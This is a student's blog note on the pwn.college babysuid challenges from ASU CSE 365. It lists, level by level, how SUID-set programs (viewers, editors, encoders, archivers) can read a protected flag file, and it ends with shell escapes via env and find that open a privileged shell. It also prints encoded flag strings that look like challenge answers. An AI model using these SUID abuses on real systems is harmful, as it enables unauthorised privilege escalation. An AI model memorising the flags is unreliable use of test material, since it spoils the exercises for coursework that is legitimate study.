---
title: "PwnCollege_Note"
description: 
date: 2022-10-29
image: 
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - Pwn.college
    - ForeignCourse

---

# ASU CSE 365

## Program Misuse

### Program Interaction:Linux Command Line



### babysuid challenge

**init:** we can use the Desktop or the Workspace(then change to the terminal) to operate.

**suid:** Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then **when the user executes the file, the file will be executed as the  file owner**, once the file is executed, the identity switch disappears.    



level 1-6: there're some simple programs that can directly read the flag：**cat, more, less, tail, head, sort**

level 7-9: there're some tools  ----> over-privileged **editors**：**vim, emacs, nano**

> emacs points to emacs-gtk by default, it will try to open if there's a graphical interface. But gtk can't setuid, so we can use the `-nw` to forces the graphics window not to pop up.

![](img/pwn_college/level8/image-20221030103804124.png)

**output**

level 10：**rev**---> Used to output each line of a file in reverse order of characters, that is, the first character is last and the last character is first.

level 11: **od**---> Octal, decimal, hex, ASCII dump

```shell
-b:octal		-x -h:hex
-c:ASCII		-d:Decimal(ten)
```

level 12: **hd**---> hexdump, mainly used to view the **hexadecimal encoding** of **Binary files**.

level 13: **xxd**---> Convert any file to **hexadecimal** or binary(-b) form

level 14: **base32**---> `echo 'some-base32-codings' | base32 -d` can decode the base32 coding

```
'ORUGS4ZANFZSA43PNVSSA5DFPB2CASJAO5QW45BAORXSAZLOMNXWIZIK'
```

level 15: **base64**---> decode form same as the base32

```
'cHduLmNvbGxlZ2V7NGxNTU1ILXJFUTdBZHZvNjVzNDEyV0p5Y1ZNLlFYM1VUTXNVRE40WXpXfQo='
```

level 16: **split**---> split the file to the 'xaa' file default(1000row to split).

```shell
split [-b byte][-C ][-][-l rowcount][the file to split][the prefix of the output_file][-a suffix_len]
```

**different archieve format**

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.

level 17: **gzip**

```shell
gzip -f file_name -t		(-d decompress)
```

level 18: **bzip2**

```shell
bzip2 -c file_name | bzip2 -d
```

level 19: **zip**

```shell
zip flag.zip flag #flag --> flag.zip
cat flag.zip #you can see the flag
```

level 20: **tar**

```shell
tar -cf flag.tar.gz flag  	#(-c:create new backup file -f:specify the backup file)
cat flag.tar.gz
```

level 21: **ar** ---> to create or modify a backup file

```shell
ar rv flag.back flag
cat flag.back
```

level 22: **cpio**--->used to backup file

```shell
cpio -o	回车	#-o Create the archive (run in copy-out mode)
flag
ctrl + D得到flag
```

level 23: **genisoimage**---> used to create an ISO 9660 image file, the output is placed inside the ISO9660 file system binary format.

the file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.

```shell
genisoimage -sort flag
```

**execute other commands**

It can be used to break out from restricted environments by spawning an interactive system shell

level 24: **env**--->show environment variables that already exists in the system and executes instructions in the defined environment

```shell
env /bin/sh -p #getshell
```

level 25: **find**--->used to find files in the specified directory

```shell
find . -exec /bin/sh -p \;
```

